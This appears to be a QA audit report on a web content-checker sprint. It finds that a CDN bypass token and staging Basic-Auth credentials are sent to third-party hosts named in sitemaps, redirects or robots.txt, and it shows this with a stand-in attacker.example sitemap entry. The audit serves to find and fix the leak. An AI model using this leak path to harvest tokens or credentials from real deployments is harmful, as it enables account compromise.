title: Outbound identification token and CDN challenge guidance

history.detail:
CONDITIONAL: QA1 STATIC AUDIT — SPRINT 7 — ROUND 1 — VERDICT: CONDITIONAL (one required fix, two defects, same fix)
Audited commit a694979b2f97ed3cda13f71c6649471b231a1cdf on main, against base d198a43 (Sprint 5 close). The commit is clean; the WORKING TREE is not — docs/sprints/1-todo/sprint-6_*.md carries an uncommitted edit (Master Controller's todo file, not Sprint 7 code). I audited the commit. See PROCESS below.
Sprint file re-read fresh immediately before this verdict. No cross-version ("arrives between release A and B") criterion. No new dependencies.

The sprint's own requirements are implemented well — every acceptance criterion I could verify statically passes, the single-injection-point design is exactly right, and the secret-handling discipline (Boolean() everywhere below config/app/pinnedFetch) is the standard I want. The problem is a case the sprint file did not think about and the code therefore does not handle: where the secrets GO.

=== THE REQUIRED FIX ===
Outbound secrets — the new X-ContentCheck-Token AND the existing staging Basic-Auth Authorization header — are sent to any host the tool happens to fetch, including hosts chosen by sitemap content and cross-host redirects. Both must be scoped to the project's own configured origins.

A. [HIGH — token exfiltration] The token is added unconditionally by wrapFetchWithOutboundToken (lib/net/pinnedFetch.js:120-125). DEMONSTRATED two ways through the real route with a sentinel token:
   (a) Staging sitemap lists <loc>https://attacker.example/harvest/</loc>. It's not on live → onStagingOnly → title fetch → the request to attacker.example carries X-ContentCheck-Token: <the agency's token>.
   (b) Staging sitemap.xml 302s to https://cdn.thirdparty.example/sitemap.xml → the redirect hop carries the token (Authorization was correctly dropped on the same hop — Sprint 4 fix H — which shows the two headers are held to different standards).
   Why this matters: the token is one per-deployment secret that, once the allow rule is rolled out across the agency's managed Cloudflare accounts, bypasses bot protection on EVERY client zone. Anyone who controls a sitemap the agency scans — a compromised WordPress install, which is routine, or a malicious client — receives that token and can use it against every other client until Sprint 6's ip.src tightening lands. The Dependencies section explicitly sequences the rule rollout BEFORE Sprint 6, so that window is by design. Requirement 3 says "same handling standard as the encryption key and the session secret." We would not send the session secret to a host named by untrusted data. docs/cdn-allow-rule.md line 33 ("an attacker has no way to learn or guess it") is false as built; line 70 ("a stolen or leaked token") is the honest one.

B. [HIGH — staging credential leak, PRE-EXISTING, found now] Staging Basic-Auth credentials go to the same third-party host. DEMONSTRATED in the same probe: the title fetch to attacker.example carried Authorization: Basic <staging user:password>. Root cause: httpClient.js's origin scoping compares each hop against the origin of the URL passed to THAT guardedFetch call (originalOrigin = new URL(targetUrl).origin), so it protects against redirects but not against the initial URL being a third-party host. resolveTitles (Sprint 4) uses its auth-bound stagingFetch for every staging-side item, and a staging-side item's URL comes from the staging sitemap — untrusted. The same path exists in discovery: a robots.txt "Sitemap: https://elsewhere.example/…" directive is fetched with auth. This is Sprint 3/4/5 code, not Sprint 7's — but Sprint 7 is the sprint that owns the outbound-secret layer, the fix is one mechanism for both headers, and I am not passing a sprint whose whole subject is "identify ourselves with a secret" while the code hands two secrets to strangers. Not a test in the suite covers a non-project host (grep-confirmed).

FIX SHAPE (Dev Team's call how; this is the boundary):
   The route already knows the project's two origins (new URL(project.liveUrl).origin, new URL(project.stagingUrl).origin). Thread an allowed-origin set into the outbound layer so that:
   - X-ContentCheck-Token is sent only when the request's origin (per hop) is the live or staging origin;
   - Authorization is sent only when the request's origin (per hop) is the STAGING origin — not merely "same as the first hop of this call";
   - any URL outside those origins is still fetched (a sitemap may legitimately reference a CDN host for assets — but titles for off-host pages are a stretch; Dev Team may reasonably decide to skip title fetches for off-project-origin URLs entirely and slug them, which also removes the wasted request). Either way, no secret leaves the project's origins.
   Where: the cleanest place is createGuardedFetch (it already has per-hop origin logic for Authorization — generalize it to "secret headers allowed for these origins"), with the token wrapper receiving the same origin set rather than being unconditional. Keep the single injection point.
   Tests: a third-party <loc> on the staging side asserting NEITHER header reaches it; a cross-host redirect asserting neither header on the hop; a same-project cross-side redirect (staging → live) asserting the token IS still sent and Authorization is NOT; a robots.txt Sitemap: directive to a foreign host asserting no Authorization. Authoring them is Dev Team's job.

FOR MASTER CONTROLLER — sprint-file amendment needed, raised here rather than absorbed:
   Requirement 1 says "on every request the tool makes … and every redirect hop the tool follows." Read literally, that mandates finding A. The intent (Context: "identify itself to client CDNs") is every request TO THE PROJECT'S HOSTS. Please amend requirement 1 and the second acceptance criterion to say so; the sprint-file hash check will make the amended file the one this fix is re-audited against, which is the correct flow. While there: docs/cdn-allow-rule.md line 33 should say what line 70 says — any host the tool scans necessarily sees the token (that is the point of sending it), so a compromised client site can capture it, which is precisely why the Sprint 6 ip.src tightening is not optional.

=== ACCEPTANCE CRITERIA — everything else, verified ===
- Single injection point: X-ContentCheck-Token / OUTBOUND_TOKEN_HEADER_NAME appears in lib/net/pinnedFetch.js (definition + merge) and src/lib/scanErrorPresentation.js (message text only). Neither lib/sitemap nor lib/compare references it. wrapFetchWithOutboundToken is composed once in src/app.js around whichever base fetch is in play (real pinned or test-injected) — the split from createPinnedFetch is a good design, it's what let me exercise the real token path with the fixture harness.
- Every request type: captured headers on robots.txt (both sides), sitemap index, child sitemap, a 301 redirect hop, and a title fetch — all carry the token, single value. Requirement 1 as written: met. (And that is the problem — see A.)
- Unset: no header on any request (verified with the real wrapper), and the startup notice prints "[content-checker] outbound identification token is not configured (CONTENTCHECK_OUTBOUND_TOKEN unset) — outbound requests will not carry it. Run `npm run generate-outbound-token` to generate one." Too short (5 chars): "Startup failed: Invalid environment variable: CONTENTCHECK_OUTBOUND_TOKEN must be at least 32 characters when set. …" — names the variable, exit 1. Whitespace-only → treated as unset (correct).
- Secret never rendered/logged/in errors: grep confirms the raw config.outboundToken is touched only by src/config.js, src/app.js, lib/net/pinnedFetch.js; scan router, presentation, views, errors.js receive Boolean() only. Rendered page across DNS-failure + malformed-XML + challenge paths contains no trace of the sentinel (full value or 12-char prefix). Requirement-9 suite in scan.integration.test.js exercises 401/403/challenge/DNS/malformed with a known token and asserts absence in output and server logs — present and meaningful.
- Generator: prints CONTENTCHECK_OUTBOUND_TOKEN=<64 hex chars> from crypto.randomBytes(32), takes no input. .env.example documents variable, purpose, generator.
- User-Agent: constants.js reads ContentCheckerBot/1.0 (+https://tools.wordzite.com/content-checker). grep -rEn "content-check($|[^e])" src/ lib/ bin/ views/ .env.example → nothing. package.json description updated too.
- Challenge classification keys on the header: cf-mitigated: challenge → CDN_CHALLENGE, checked before the 401/403 branch. A plain 403 whose BODY says "Just a moment…" but lacks the header → still HTTP_403 → Sprint 5's credentials message. Verified both directions through the real route.
- Challenge message: names X-ContentCheck-Token, shows (http.request.headers["x-contentcheck-token"][0] eq "<your token>") with the placeholder, says "action Skip", references docs/cdn-allow-rule.md, explicitly says "not a credentials problem", never contains the real token. Not-configured variant leads with "An outbound identification token is not configured (CONTENTCHECK_OUTBOUND_TOKEN is unset), so there's nothing yet for an allow rule to match on — set that first." followed by the rule. Discovery-path challenge (every attempt CDN_CHALLENGE) is recognized via the attempts log — the lesson from Sprint 5 finding B applied proactively, good.
- docs/cdn-allow-rule.md: expression ✓, Skip + components (Managed Challenge/BFM, WAF managed rules, rate limiting) ✓, ip.src tightening with a marked placeholder ✓, three caveats (Free-plan BFM, whole-host scope, Wordfence) ✓, explicit UA-matching prohibition with reasoning ✓.
- npm test 433/433, lint exit 0.

=== NON-BLOCKING ===
C. [LOW] "Links to the documentation" is a plain-text path (docs/cdn-allow-rule.md) in the message, not a hyperlink — the doc lives in the repo and isn't served by the app, so there's nothing to link to. Acceptable now; if MC wants a real link, the app would need to serve the doc (or a rendered copy) under BASE_PATH. MC's call.
D. [LOW] mergeOutboundTokenHeader spreads init.headers as a plain object; a Headers instance would spread to {} and lose User-Agent/Authorization. Every current caller passes a plain object, so this is latent. A typeof/instanceof guard or Object.fromEntries(headers) would close it.
E. [PROCESS] MC's amendment to requirement 5 (and its new acceptance criterion) was committed inside Dev Team's code commit a694979 — same as Sprint 4 item O. Substance fine; keep sprint-file edits out of code commits.
F. [PROCESS — will bite Pipeman] docs/sprints/1-todo/sprint-6_*.md has an uncommitted edit in the working tree. If it is committed AFTER a QA1 PASS on this sprint, the whole-repo tree hash changes and /sprint-ship will refuse (we learned this on Sprint 3). Commit it before Dev Team's fix commit, or after ship — not in between.
G. [INFO] .env exists on disk with PORT/BASE_PATH/SESSION_SECRET/TEAM_PASSWORD_HASH/ENCRYPTION_KEY set (names only checked); it is gitignored and untracked. Fine.

=== FOR THE RE-AUDIT ===
One mechanism, two headers. I will re-run the exfiltration probe (third-party <loc>, cross-host redirect, foreign Sitemap: directive) asserting neither header arrives; re-run the every-request-type probe asserting the token still arrives on all project-origin hops including a redirect; re-run the challenge/no-regression cases; and re-verify the tree. If MC amends requirement 1 first, the re-audit reads the amended file.
